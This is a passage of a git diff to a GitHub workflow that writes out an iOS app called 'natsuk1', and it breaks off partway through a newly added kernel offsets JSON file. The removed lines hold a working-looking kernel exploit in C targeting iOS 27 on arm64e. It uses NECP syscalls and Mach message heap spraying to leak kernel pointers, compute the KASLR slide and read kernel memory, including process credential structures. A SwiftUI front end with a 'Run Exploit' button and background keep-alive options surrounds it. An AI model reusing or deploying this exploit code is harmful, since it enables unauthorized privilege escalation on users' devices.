@@ -30,819 +30,115 @@ jobs:
           rm -f .github/workflows/natsuk1.yml
           rm -f .github/workflows/main.yml
 
-      - name: Write natsuk1.swift
+      - name: Write offsets JSON
         run: |
-          cat > natsuk1/natsuk1.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-          import Foundation
-
-          final class LockedBuffer: @unchecked Sendable {
-              nonisolated(unsafe) static let shared = LockedBuffer()
-              private let lock = NSLock()
-              private var value: String = ""
-              private init() {}
-              func append(_ s: String) {
-                  lock.lock(); value += s + "\n"
-                  if value.count > 10000 { value = String(value.suffix(6000)) }
-                  lock.unlock()
-              }
-              func drain() -> String { lock.lock(); let v = value; value = ""; lock.unlock(); return v }
-              func clear() { lock.lock(); value = ""; lock.unlock() }
-          }
-
-          private let cCallback: @convention(c) (UnsafePointer<CChar>?) -> Void = { line in
-              guard let line = line else { return }
-              var bytes: [UInt8] = []
-              var p = line
-              while p.pointee != 0 { bytes.append(UInt8(bitPattern: p.pointee)); p = p.advanced(by: 1) }
-              LockedBuffer.shared.append(String(decoding: bytes, as: UTF8.self))
-          }
-
-          private func osVersionString() -> String {
-              let v = ProcessInfo.processInfo.operatingSystemVersion
-              return "\(v.majorVersion).\(v.minorVersion)"
-          }
-          private func appVersionString() -> String {
-              Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
-          }
-          private var isSupportedIOS: Bool {
-              ProcessInfo.processInfo.operatingSystemVersion.majorVersion == 27
-          }
-
-          @main
-          struct natsuk1App: App {
-              var body: some Scene { WindowGroup { RootView() } }
-          }
-
-          struct RootView: View {
-              @StateObject private var state = AppState.shared
-              @StateObject private var offsets = OffsetsStore.shared
-              @StateObject private var airlift = AirliftBridge.shared
-              @AppStorage("auto_run") private var auto_run = false
-              @AppStorage("keep_alive_audio") private var keep_alive_audio = false
-              @AppStorage("keep_alive_location") private var keep_alive_location = false
-
-              init() {
-                  UserDefaults.standard.register(defaults: [
-                      "auto_run": false, "keep_alive_audio": false,
-                      "keep_alive_location": false, "lang": "en"])
-              }
-
-              var body: some View {
-                  Group {
-                      if isSupportedIOS {
-                          ContentView()
-                              .environmentObject(state)
-                              .environmentObject(offsets)
-                              .environmentObject(airlift)
-                              .onAppear {
-                                  nk_set_log(cCallback)
-                                  if state.log.isEmpty {
-                                      state.append("[*] natsuk1 v\(appVersionString())")
-                                      state.append("[*] iOS \(osVersionString()) / arm64e")
-                                      state.append("")
-                                  }
-                                  if keep_alive_audio { KeepAlive.shared.startAudio() }
-                                  if keep_alive_location { KeepAlive.shared.startLocation() }
-                                  if auto_run {
-                                      DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { state.run() }
-                                  }
-                              }
-                              .onChange(of: keep_alive_audio) { _, v in
-                                  if v { KeepAlive.shared.startAudio() } else { KeepAlive.shared.stopAudio() }
-                              }
-                              .onChange(of: keep_alive_location) { _, v in
-                                  if v { KeepAlive.shared.startLocation() } else { KeepAlive.shared.stopLocation() }
-                              }
-                              .overlay {
-                                  if state.show_respring {
-                                      RespringView().brightness(-1.0).ignoresSafeArea()
-                                  }
-                              }
-                      } else {
-                          NotSupportedView(version: osVersionString())
-                      }
-                  }
-              }
-          }
-
-          struct NotSupportedView: View {
-              let version: String
-              var body: some View {
-                  VStack(spacing: 16) {
-                      Image(systemName: "exclamationmark.triangle.fill")
-                          .font(.system(size: 48)).foregroundStyle(.orange)
-                      Text("Not supported for iOS \(version)")
-                          .font(.title3).fontWeight(.semibold).multilineTextAlignment(.center)
-                      Text("natsuk1 runs on iOS 27 only.")
-                          .font(.subheadline).foregroundStyle(.secondary).multilineTextAlignment(.center)
-                  }
-                  .padding(40)
-                  .frame(maxWidth: .infinity, maxHeight: .infinity)
-                  .background(Color(UIColor.systemGroupedBackground).ignoresSafeArea())
-              }
-          }
-
-          final class AppState: ObservableObject, @unchecked Sendable {
-              nonisolated(unsafe) static let shared = AppState()
-              enum Status {
-                  case idle, running, ok, failed
-                  var color: Color {
-                      switch self {
-                      case .idle: return .secondary
-                      case .running: return .orange
-                      case .ok: return .green
-                      case .failed: return .red
-                      }
-                  }
-              }
-              @Published var log: String = ""
-              @Published var status: Status = .idle
-              @Published var running: Bool = false
-              @Published var show_respring: Bool = false
-              @Published var lang: String { didSet { UserDefaults.standard.set(lang, forKey: "lang") } }
-
-              private init() {
-                  self.lang = UserDefaults.standard.string(forKey: "lang") ?? "en"
-                  startFlusher()
-              }
-              func t(_ en: String, _ ru: String) -> String { lang == "ru" ? ru : en }
-
-              private func startFlusher() {
-                  Task { [weak self] in
-                      while !Task.isCancelled {
-                          try? await Task.sleep(for: .milliseconds(300))
-                          guard let self else { return }
-                          let chunk = LockedBuffer.shared.drain()
-                          guard !chunk.isEmpty else { continue }
-                          var newLog = self.log
-                          newLog += chunk
-                          if newLog.count > 30000 { newLog = String(newLog.suffix(20000)) }
-                          self.log = newLog
-                      }
-                  }
-              }
-              func append(_ s: String) { LockedBuffer.shared.append(s) }
-              func run() {
-                  if running { return }
-                  running = true; status = .running
-                  Task.detached {
-                      _ = nk_full_exploit()
-                      await MainActor.run {
-                          AppState.shared.running = false
-                          AppState.shared.status = .ok
-                      }
-                  }
-              }
-              func necp_run() {
-                  if running { return }
-                  running = true; status = .running
-                  Task.detached {
-                      let rc = nk_necp_run()
-                      await MainActor.run {
-                          AppState.shared.running = false
-                          AppState.shared.status = (rc == 0) ? .ok : .failed
-                      }
-                  }
-              }
-              func respring() { show_respring = true }
-              func clear() { LockedBuffer.shared.clear(); log = "" }
-          }
-          SWIFT
-
-      - name: Write ContentView.swift
-        run: |
-          cat > natsuk1/Views/ContentView.swift <<'SWIFT'
-          import SwiftUI
-
-          struct ContentView: View {
-              @EnvironmentObject var state: AppState
-              var body: some View {
-                  TabView {
-                      OverviewView()
-                          .tabItem { Label(state.t("Overview", "Обзор"), systemImage: "bolt.fill") }
-                      ToolsView()
-                          .tabItem { Label(state.t("Tools", "Инструменты"), systemImage: "wrench.and.screwdriver.fill") }
-                      SettingsView()
-                          .tabItem { Label(state.t("Settings", "Настройки"), systemImage: "gearshape.fill") }
-                  }
-                  .tint(.accentColor)
-              }
-          }
-          SWIFT
-
-      - name: Write OverviewView.swift
-        run: |
-          cat > natsuk1/Views/OverviewView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-
-          struct OverviewView: View {
-              @EnvironmentObject var state: AppState
-
-              var body: some View {
-                  NavigationStack {
-                      List {
-                          Section {
-                              Button {
-                                  state.necp_run()
-                              } label: {
-                                  HStack {
-                                      Text("Run Exploit")
-                                      Spacer()
-                                      if state.running { ProgressView().scaleEffect(0.8) }
-                                  }
-                              }
-                              .disabled(state.running)
-                          } header: {
-                              Label("Kernel Read Write", systemImage: "cpu")
-                          }
-
-                          Section {
-                              HStack {
-                                  Text(state.t("Status", "Статус"))
-                                  Spacer()
-                                  StatusDot(status: state.status)
-                              }
-                          } header: {
-                              Label(state.t("Runtime", "Состояние"), systemImage: "waveform.path.ecg")
-                          } footer: {
-                              Text(DeviceName.full()).font(.system(size: 12, design: .monospaced))
-                          }
-
-                          Section {
-                              LogTerminal(text: state.log.isEmpty ? "Awaiting execution." : state.log)
-                          } header: {
-                              Label(state.t("Logs", "Логи"), systemImage: "terminal")
-                          }
-
-                          Section {
-                              Button { UIPasteboard.general.string = state.log } label: {
-                                  Text(state.t("Copy All", "Копировать всё"))
-                              }.disabled(state.log.isEmpty)
-                              Button(role: .destructive) { state.clear() } label: {
-                                  Text(state.t("Clear", "Очистить"))
-                              }.disabled(state.log.isEmpty)
-                          }
-                      }
-                      .listStyle(.insetGrouped)
-                      .navigationTitle("natsuk1")
-                      .navigationBarTitleDisplayMode(.inline)
-                  }
-              }
-          }
-
-          struct StatusDot: View {
-              let status: AppState.Status
-              @State private var pulse = false
-              var body: some View {
-                  Image(systemName: "circle.fill")
-                      .font(.system(size: 14))
-                      .foregroundStyle(status.color)
-                      .shadow(color: status.color.opacity(0.85), radius: pulse ? 8 : 4)
-                      .scaleEffect(pulse ? 1.2 : 1.0)
-                      .animation(
-                          status == .running
-                              ? .easeInOut(duration: 0.8).repeatForever(autoreverses: true)
-                              : .default,
-                          value: pulse
-                      )
-                      .onAppear { if status == .running { pulse = true } }
-                      .onChange(of: status) { _, s in pulse = (s == .running) }
-              }
-          }
-
-          struct LogTerminal: View {
-              let text: String
-              var body: some View {
-                  ScrollView {
-                      Text(text)
-                          .font(.system(size: 10, design: .monospaced))
-                          .multilineTextAlignment(.leading)
-                          .foregroundStyle(.primary)
-                          .frame(maxWidth: .infinity, alignment: .leading)
-                  }
-                  .frame(minHeight: 200, maxHeight: 400)
-              }
-          }
-          SWIFT
-
-      - name: Write ToolsView.swift
-        run: |
-          cat > natsuk1/Views/ToolsView.swift <<'SWIFT'
-          import SwiftUI
-
-          struct ToolsView: View {
-              @EnvironmentObject var state: AppState
-              @EnvironmentObject var airlift: AirliftBridge
-              @EnvironmentObject var offsets: OffsetsStore
-
-              var body: some View {
-                  NavigationStack {
-                      List {
-                          Section {
-                              NavigationLink { AirliftView().environmentObject(airlift) } label: { Text("Airlift") }
-                              NavigationLink { OffsetsView().environmentObject(offsets) } label: { Text("Offsets") }
-                          } header: {
-                              Label("Exploit", systemImage: "flame")
-                          }
-
-                          Section {
-                              NavigationLink { DeviceInfoView() } label: { Text("Device Info") }
-                              Button { state.respring() } label: { Text("Respring") }
-                          } header: {
-                              Label("Device", systemImage: "iphone.gen3")
-                          }
-
-                          Section {
-                              NavigationLink { PathAccessView() } label: { Text("Path Access") }
-                          } header: {
-                              Label("Diagnostics", systemImage: "waveform.path.ecg.rectangle")
-                          }
-                      }
-                      .listStyle(.insetGrouped)
-                      .navigationTitle("Tools")
-                      .navigationBarTitleDisplayMode(.large)
-                  }
-              }
-          }
-          SWIFT
-
-      - name: Write SettingsView.swift
-        run: |
-          cat > natsuk1/Views/SettingsView.swift <<'SWIFT'
-          import SwiftUI
-          import UIKit
-
-          struct SettingsView: View {
-              @EnvironmentObject var state: AppState
-              @AppStorage("auto_run") private var auto_run: Bool = false
-              @AppStorage("verbose") private var verbose: Bool = true
-              @AppStorage("keep_alive_audio") private var keep_alive_audio: Bool = false
-              @AppStorage("keep_alive_location") private var keep_alive_location: Bool = false
-
-              private var appName: String {
-                  Bundle.main.infoDictionary?["CFBundleDisplayName"] as? String
-                      ?? Bundle.main.infoDictionary?["CFBundleName"] as? String ?? "natsuk1"
-              }
-              private var version: String {
-                  Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0"
-              }
-              private var appIcon: UIImage? {
-                  if let icons = Bundle.main.infoDictionary?["CFBundleIcons"] as? [String: Any],
-                     let primary = icons["CFBundlePrimaryIcon"] as? [String: Any],
-                     let files = primary["CFBundleIconFiles"] as? [String],
-                     let last = files.last { return UIImage(named: last) }
-                  return UIImage(named: "AppIcon")
-              }
-
-              var body: some View {
-                  NavigationStack {
-                      List {
-                          Section {
-                              HStack(spacing: 14) {
-                                  Group {
-                                      if let icon = appIcon {
-                                          Image(uiImage: icon).resizable().aspectRatio(contentMode: .fill)
-                                      } else {
-                                          ZStack {
-                                              LinearGradient(colors: [Color.accentColor, Color.accentColor.opacity(0.6)],
-                                                             startPoint: .topLeading, endPoint: .bottomTrailing)
-                                              Image(systemName: "bolt.fill").font(.system(size: 26, weight: .semibold)).foregroundStyle(.white)
-                                          }
-                                      }
-                                  }
-                                  .frame(width: 56, height: 56)
-                                  .clipShape(RoundedRectangle(cornerRadius: 12, style: .continuous))
-                                  VStack(alignment: .leading, spacing: 2) {
-                                      Text(appName).font(.title3).fontWeight(.semibold)
-                                      Text("Version \(version)").font(.subheadline).foregroundStyle(.secondary)
-                                  }
-                              }
-                              NavigationLink { AboutView().environmentObject(state) } label: { Text("About") }
-                          } header: {
-                              Label("App", systemImage: "square.stack.3d.up")
-                          }
-
-                          Section {
-                              Toggle(isOn: $keep_alive_audio) {
-                                  VStack(alignment: .leading, spacing: 2) {
-                                      Text("Silent Audio")
-                                      Text("Keeps the app running in the background.").font(.caption).foregroundStyle(.secondary)
-                                  }
-                              }
-                              Toggle(isOn: $keep_alive_location) {
-                                  VStack(alignment: .leading, spacing: 2) {
-                                      Text("Background Location")
-                                      Text("Low-accuracy location keeps the app alive.").font(.caption).foregroundStyle(.secondary)
-                                  }
-                              }
-                          } header: {
-                              Label("Background Keep-Alive", systemImage: "moon.zzz")
-                          }
-
-                          Section {
-                              Toggle("Auto Run on Launch", isOn: $auto_run)
-                              Toggle("Verbose Output", isOn: $verbose)
-                          } header: {
-                              Label("Options", systemImage: "switch.2")
-                          }
-                      }
-                      .listStyle(.insetGrouped)
-                      .navigationTitle("Settings")
-                      .navigationBarTitleDisplayMode(.large)
-                  }
-              }
-          }
-          SWIFT
-
-      - name: Write nk_api.h
-        run: |
-          cat > natsuk1/Exploit/nk_api.h <<'HEADER'
-          #ifndef NK_API_H
-          #define NK_API_H
-          #include <stdint.h>
-          #include <stddef.h>
-          void nk_set_log(void (*fn)(const char *));
-          void nk_logx(const char *tag, const char *fmt, ...);
-          void nk_log(const char *fmt, ...);
-          void nk_rule(void);
-          int nk_run(void);
-          int nk_full_exploit(void);
-          int nk_necp_run(void);
-          #define NK_INFO(tag, ...) nk_logx(tag, __VA_ARGS__)
-          #define NK_WARN(tag, ...) nk_logx(tag, __VA_ARGS__)
-          #define NK_ERR(tag, ...)  nk_logx(tag, __VA_ARGS__)
-          #endif
-          HEADER
-
-      - name: Write necp.c
-        run: |
-          cat > natsuk1/Exploit/necp.c <<'NECP'
-          #include <stdio.h>
-          #include <stdlib.h>
-          #include <string.h>
-          #include <stdint.h>
-          #include <stdbool.h>
-          #include <stdarg.h>
-          #include <unistd.h>
-          #include <errno.h>
-          #include <pthread.h>
-          #include <sys/syscall.h>
-          #include <mach/mach.h>
-          #include <mach/vm_map.h>
-          #include <mach/vm_region.h>
-          #include <mach/message.h>
-
-          #include "nk_api.h"
-
-          #ifndef SYS_NECP_OPEN
-          #define SYS_NECP_OPEN           501
-          #endif
-          #ifndef SYS_NECP_ACTION
-          #define SYS_NECP_ACTION         502
-          #endif
-
-          #define KERNEL_BASE_STATIC      0xFFFFFFF007004000ULL
-          #define OFF_ALLPROC             0xBBB048ULL
-          #define OFF_KERNPROC            0xBBB040ULL
-          #define OFF_KERNEL_TASK         0x009C70ULL
-          #define OFF_TASK_LIST           0x10D53F0ULL
-          #define OFF_KERNEL_MAP          0xBBA228ULL
-          #define OFF_ZONE_MAP            0x3D66800ULL
-          #define PROC_PID_OFF            0x74
-          #define PROC_RO_P_UCRED_OFF     0xB8
-          #define TASK_BSD_INFO_OFF       0x3A0
-          #define TASK_ITK_SPACE_OFF      0x320
-          #define TASK_MAP_OFF            0x28
-          #define THREAD_TASK_NEXT_OFF    0x50
-          #define UCRED_UID_OFF           0x18
-          #define UCRED_SVUID_OFF         0x1C
-          #define UCRED_GID_OFF           0x1C
-          #define UCRED_SVGID_OFF         0x20
-          #define NCF_ASSIGNED_OFF        0x68
-          #define NCF_ASSIGNED_LEN_OFF    0x70
-          #define NCF_PARENT_OFF          0x88
-          #define NCF_REFCNT_OFF          0x58
-          #define NCF_STRUCT_SZ           256
-          #define NECP_ADD_CLIENT         0x01
-          #define NECP_COPY_RESULT        0x04
-          #define NECP_ADD_FLOW           0x11
-          #define NECP_REMOVE_FLOW        0x12
-          #define GATE_BYTE               9
-          #define EXHAUST_N               2048
-          #define SPRAY_N                 512
-          #define DECRETRY_N              24
-          #define RESULT_BUF_SZ           8192
-          #define KPTR_MIN                0xFFFFFFF000000000ULL
-          #define KPTR_MAX                0xFFFFFFFFFF000000ULL
-
-          static uint64_t g_kbase   = 0;
-          static uint64_t g_slide   = 0;
-          static int      g_res_off = -1;
-          static uint8_t  g_res_buf[RESULT_BUF_SZ];
-
-          typedef struct {
-              mach_msg_header_t          hdr;
-              mach_msg_body_t            body;
-              mach_msg_ool_descriptor_t  ool;
-          } ool_send_t;
-
-          static void log_info(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "%s", body);
-          }
-          static void log_ok(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "+ %s", body);
-          }
-          static void log_err(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "- %s", body);
-          }
-          static void log_warn(const char *tag, const char *fmt, ...) {
-              char body[448];
-              va_list ap; va_start(ap, fmt); vsnprintf(body, sizeof(body), fmt, ap); va_end(ap);
-              nk_logx(tag, "! %s", body);
-          }
-
-          static void dump_hex(const char *tag, const uint8_t *p, size_t n) {
-              char line[256];
-              int off = 0;
-              size_t lim = n < 64 ? n : 64;
-              for (size_t i = 0; i < lim; i++) off += snprintf(line + off, sizeof(line) - off, "%02x", p[i]);
-              nk_logx(tag, "%s (%zu bytes)", line, n);
-          }
-
-          static mach_port_t port_new(void) {
-              mach_port_t p = MACH_PORT_NULL;
-              kern_return_t kr = mach_port_allocate(mach_task_self(),
-                                                    MACH_PORT_RIGHT_RECEIVE, &p);
-              if (kr != KERN_SUCCESS) { log_err("PORT", "allocate kr=%d", kr); return MACH_PORT_NULL; }
-              kr = mach_port_insert_right(mach_task_self(), p, p, MACH_MSG_TYPE_MAKE_SEND);
-              if (kr != KERN_SUCCESS) { log_err("PORT", "insert_right kr=%d", kr); }
-              return p;
-          }
-
-          static void ool_spray(mach_port_t port, const void *data, size_t sz, int n) {
-              ool_send_t m;
-              for (int i = 0; i < n; i++) {
-                  memset(&m, 0, sizeof(m));
-                  m.hdr.msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0)
-                                         | MACH_MSGH_BITS_COMPLEX;
-                  m.hdr.msgh_size        = sizeof(m);
-                  m.hdr.msgh_remote_port = port;
-                  m.hdr.msgh_id          = 0x4E41 + i;
-                  m.body.msgh_descriptor_count = 1;
-                  m.ool.address    = (void*)data;
-                  m.ool.size       = (mach_msg_size_t)sz;
-                  m.ool.copy       = MACH_MSG_VIRTUAL_COPY;
-                  m.ool.deallocate = FALSE;
-                  m.ool.type       = MACH_MSG_OOL_DESCRIPTOR;
-                  mach_msg(&m.hdr, MACH_SEND_MSG, sizeof(m), 0, MACH_PORT_NULL,
-                           MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
-              }
-          }
-
-          static void ool_drain(mach_port_t port, int n) {
-              uint8_t buf[NCF_STRUCT_SZ + 512];
-              mach_msg_header_t *h = (mach_msg_header_t*)buf;
-              for (int i = 0; i < n; i++) {
-                  h->msgh_size = sizeof(buf);
-                  kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
-                                              0, sizeof(buf), port, 1, MACH_PORT_NULL);
-                  if (kr != KERN_SUCCESS) break;
-              }
-          }
-
-          static int necp_open_fd(void) { return (int)syscall(SYS_NECP_OPEN, 0); }
-          static int necp_add_client(int fd, uint8_t uuid[16]) {
-              uint8_t p[1] = {0};
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_CLIENT, uuid, (size_t)16, p, (size_t)1);
-          }
-          static int necp_add_flow(int fd, const uint8_t cuuid[16], uint8_t fuuid[16]) {
-              uint8_t req[56];
-              memset(req, 0, sizeof(req));
-              memcpy(req + 0x10, cuuid, 16);
-              *(uint16_t*)(req + 0x20) = 0x0040;
-              int r = (int)syscall(SYS_NECP_ACTION, fd, NECP_ADD_FLOW, (void*)cuuid, (size_t)16, req, (size_t)56);
-              if (r == 0) { memcpy(fuuid, req, 16); fuuid[GATE_BYTE] |= 0x01; }
-              return r;
-          }
-          static int necp_remove_flow(int fd, const uint8_t fuuid[16]) {
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_REMOVE_FLOW, (void*)fuuid, (size_t)16, NULL, (size_t)0);
-          }
-          static int necp_copy_result(int fd, const uint8_t cuuid[16], uint8_t *buf, size_t blen) {
-              return (int)syscall(SYS_NECP_ACTION, fd, NECP_COPY_RESULT, (void*)cuuid, (size_t)16, buf, (uint32_t)blen);
-          }
-
-          static uint64_t necp_primary_leak(uint8_t *out, size_t outsz) {
-              int fd = necp_open_fd();
-              if (fd < 0) { log_err("LEAK", "open errno=%d", errno); return 0; }
-              uint8_t cuuid[16], fuuid[16];
-              if (necp_add_client(fd, cuuid) != 0) { log_err("LEAK", "add_client errno=%d", errno); close(fd); return 0; }
-              if (necp_add_flow(fd, cuuid, fuuid) != 0) { log_err("LEAK", "add_flow errno=%d", errno); close(fd); return 0; }
-              necp_remove_flow(fd, fuuid);
-              memset(out, 0, outsz);
-              int r = necp_copy_result(fd, cuuid, out, outsz);
-              close(fd);
-              log_info("LEAK", "copy_result ret=%d", r);
-              if (r <= 0) return 0;
-              dump_hex("LEAK", out, r > 64 ? 64 : (size_t)r);
-              int found = 0;
-              for (int i = 0; i <= r - 8; i += 8) {
-                  uint64_t v; memcpy(&v, out + i, 8);
-                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
-                  log_ok("LEAK", "kptr[+0x%x] = 0x%llx", i, (unsigned long long)v);
-                  found++;
-              }
-              if (!found) { log_warn("LEAK", "no kernel pointers in %d bytes", r); return 0; }
-              return (uint64_t)found;
-          }
-
-          static uint64_t slide_from_leak(uint64_t leaked) {
-              static const uint64_t known_offs[] = { 0xBBB040, 0xBBB048, 0x009C70, 0x10D53F0, 0xBBA228, 0x3D66800 };
-              for (int i = 0; i < 6; i++) {
-                  uint64_t sl = leaked - known_offs[i];
-                  if (sl & 0x1FFFFF) continue;
-                  if (sl >= 0x400000000ULL) continue;
-                  uint64_t base = KERNEL_BASE_STATIC + sl;
-                  log_info("SLIDE", "cand[%d] off=0x%llx slide=0x%llx base=0x%llx",
-                           i, (unsigned long long)known_offs[i],
-                           (unsigned long long)sl, (unsigned long long)base);
-                  return sl;
-              }
-              return 0;
-          }
-
-          static int kread_raw(uint64_t kaddr, uint32_t len) {
-              uint8_t fake[NCF_STRUCT_SZ];
-              memset(fake, 0, sizeof(fake));
-              *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = kaddr;
-              *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = len;
-              *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;
-              uint8_t junk[NCF_STRUCT_SZ];
-              memset(junk, 0x41, sizeof(junk));
-              mach_port_t ex = port_new();
-              ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);
-              int fd = necp_open_fd();
-              if (fd < 0) { log_err("KREAD", "necp_open errno=%d", errno); mach_port_destroy(mach_task_self(), ex); return -1; }
-              uint8_t cuuid[16], fuuid[16];
-              if (necp_add_client(fd, cuuid) != 0) { log_err("KREAD", "add_client errno=%d", errno); close(fd); mach_port_destroy(mach_task_self(), ex); return -2; }
-              if (necp_add_flow(fd, cuuid, fuuid) != 0) { log_err("KREAD", "add_flow errno=%d", errno); close(fd); mach_port_destroy(mach_task_self(), ex); return -3; }
-              necp_remove_flow(fd, fuuid);
-              ool_drain(ex, EXHAUST_N);
-              mach_port_destroy(mach_task_self(), ex);
-              usleep(150);
-              mach_port_t sp = port_new();
-              ool_spray(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
-              usleep(100);
-              memset(g_res_buf, 0, RESULT_BUF_SZ);
-              int ret = necp_copy_result(fd, cuuid, g_res_buf, RESULT_BUF_SZ);
-              ool_drain(sp, SPRAY_N);
-              mach_port_destroy(mach_task_self(), sp);
-              close(fd);
-              return ret;
-          }
-
-          static int calibrate_kread(void) {
-              if (g_res_off >= 0) return 0;
-              log_info("KREAD", "calibrate with allproc @ kbase+0x%llx", (unsigned long long)OFF_ALLPROC);
-              int r = kread_raw(g_kbase + OFF_ALLPROC, 8);
-              if (r <= 0) { log_err("KREAD", "calibration ret=%d", r); return -1; }
-              log_info("KREAD", "result buf len=%d", r);
-              dump_hex("KREAD", g_res_buf, r > 64 ? 64 : (size_t)r);
-              for (int i = 0; i <= r - 8; i++) {
-                  uint64_t v; memcpy(&v, g_res_buf + i, 8);
-                  if (v >= KPTR_MIN && v <= KPTR_MAX) {
-                      log_ok("KREAD", "found kptr=0x%llx at result[%d]", (unsigned long long)v, i);
-                      g_res_off = i;
-                      return 0;
-                  }
-              }
-              log_err("KREAD", "no kernel ptr in result");
-              return -1;
-          }
-
-          static uint64_t kread64(uint64_t addr) {
-              if (g_res_off < 0 && addr != (g_kbase + OFF_ALLPROC)) {
-                  if (calibrate_kread() != 0) return 0;
-              }
-              int r = kread_raw(addr, 8);
-              if (r <= 0) return 0;
-              int off = (g_res_off >= 0) ? g_res_off : 0;
-              if (off + 8 > r) return 0;
-              uint64_t v; memcpy(&v, g_res_buf + off, 8);
-              return v;
-          }
-
-          static uint32_t kread32(uint64_t addr) { return (uint32_t)(kread64(addr) & 0xFFFFFFFF); }
-
-          typedef struct {
-              uint64_t allproc, kernproc, kernel_task, task_list, kernel_map, zone_map;
-          } kobj_t;
-
-          static int sanity_check(void) {
-              log_info("SANITY", "reading known globals via kread...");
-              uint64_t allproc     = kread64(g_kbase + OFF_ALLPROC);
-              uint64_t kernproc    = kread64(g_kbase + OFF_KERNPROC);
-              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
-              uint64_t task_list   = kread64(g_kbase + OFF_TASK_LIST);
-              uint64_t kernel_map  = kread64(g_kbase + OFF_KERNEL_MAP);
-              uint64_t zone_map    = kread64(g_kbase + OFF_ZONE_MAP);
-              log_info("SANITY", "allproc     = 0x%llx", (unsigned long long)allproc);
-              log_info("SANITY", "kernproc    = 0x%llx", (unsigned long long)kernproc);
-              log_info("SANITY", "kernel_task = 0x%llx", (unsigned long long)kernel_task);
-              log_info("SANITY", "task_list   = 0x%llx", (unsigned long long)task_list);
-              log_info("SANITY", "kernel_map  = 0x%llx", (unsigned long long)kernel_map);
-              log_info("SANITY", "zone_map    = 0x%llx", (unsigned long long)zone_map);
-              int ok = 0;
-              if (allproc     >= KPTR_MIN && allproc     <= KPTR_MAX) ok++;
-              if (kernproc    >= KPTR_MIN && kernproc    <= KPTR_MAX) ok++;
-              if (kernel_task >= KPTR_MIN && kernel_task <= KPTR_MAX) ok++;
-              if (kernel_map  >= KPTR_MIN && kernel_map  <= KPTR_MAX) ok++;
-              log_info("SANITY", "%d/4 globals look valid", ok);
-              return ok >= 2 ? 0 : -1;
-          }
-
-          static int task_sanity(void) {
-              uint64_t kernel_task = kread64(g_kbase + OFF_KERNEL_TASK);
-              if (!kernel_task) { log_err("TASK", "kernel_task=0"); return -1; }
-              uint64_t kproc = kread64(kernel_task + TASK_BSD_INFO_OFF);
-              log_info("TASK", "kernel_task->bsd_info=0x%llx", (unsigned long long)kproc);
-              if (kproc >= KPTR_MIN && kproc <= KPTR_MAX) {
-                  uint32_t pid = kread32(kproc + PROC_PID_OFF);
-                  log_info("TASK", "kernel proc pid=%u (expect 0)", pid);
-                  if (pid == 0) { log_ok("TASK", "task->bsd_info chain works"); return 0; }
-              }
-              log_warn("TASK", "chain broken");
-              return -1;
-          }
-
-          int nk_necp_run(void) {
-              nk_log("");
-              nk_log("=== natsuk1 v1.1 ===");
-              nk_log("target: iOS 27.0 / XNU / arm64e");
-              nk_log("device: iPhone14,5 / iPhone14,7");
-              nk_log("");
-              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_REFCNT_OFF=0x%x", NCF_ASSIGNED_OFF, NCF_REFCNT_OFF);
-              log_info("P0", "NECP primary leak");
-              uint8_t leak[RESULT_BUF_SZ];
-              uint64_t nptrs = necp_primary_leak(leak, sizeof(leak));
-              if (!nptrs) { log_err("P0", "no kernel ptrs — NCF_ASSIGNED_OFF likely wrong"); return 1; }
-              log_ok("P0", "%llu kernel ptrs in leak", (unsigned long long)nptrs);
-              log_info("P1", "derive slide from leak");
-              for (int i = 0; i <= RESULT_BUF_SZ - 8; i += 8) {
-                  uint64_t v; memcpy(&v, leak + i, 8);
-                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
-                  uint64_t cand = slide_from_leak(v);
-                  if (cand) { g_slide = cand; break; }
-              }
-              if (!g_slide) { log_err("P1", "no valid slide candidate"); return 1; }
-              g_kbase = KERNEL_BASE_STATIC + g_slide;
-              log_ok("P1", "slide=0x%llx kbase=0x%llx", (unsigned long long)g_slide, (unsigned long long)g_kbase);
+          mkdir -p natsuk1/Offsets
+          cat > natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json <<'JSON'
+          {
+            "groups": [
               {
-                  int fd = necp_open_fd();
-                  if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
-                  close(fd);
-                  log_ok("P2", "necp OK");
+                "title": "Kernel",
+                "items": [
+                  "off_kernel_base",
+                  "off_mach_trap_table"
+                ]
+              },
+              {
+                "title": "Globals",
+                "items": [
+                  "off_g_allproc",
+                  "off_g_kernproc",
+                  "off_g_kernel_task",
+                  "off_g_task_list",
+                  "off_g_kernel_map",
+                  "off_g_zone_map"
+                ]
+              },
+              {
+                "title": "proc / task / thread",
+                "items": [
+                  "off_proc_p_pid",
+                  "off_proc_ro_p_ucred",
+                  "off_task_map",
+                  "off_task_bsd_info",
+                  "off_task_itk_space",
+                  "off_thread_task_threads_next"
+                ]
+              },
+              {
+                "title": "NECP",
+                "items": [
+                  "off_necp_open",
+                  "off_necp_client_add_flow",
+                  "off_necp_client_remove_flow"
+                ]
+              },
+              {
+                "title": "Primitives",
+                "items": [
+                  "off_fn_copyin",
+                  "off_fn_copyout",
